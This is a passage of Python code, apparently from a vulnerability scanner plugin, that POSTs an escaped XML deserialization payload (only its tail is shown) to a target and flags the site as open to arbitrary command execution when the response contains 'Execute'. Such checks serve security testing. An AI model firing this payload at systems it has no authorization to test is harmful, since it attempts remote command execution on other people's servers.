20\\u007d\\u0020\\u007d</string></void></void></java>'
        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "Execute" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n\n                 {}".format(data)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False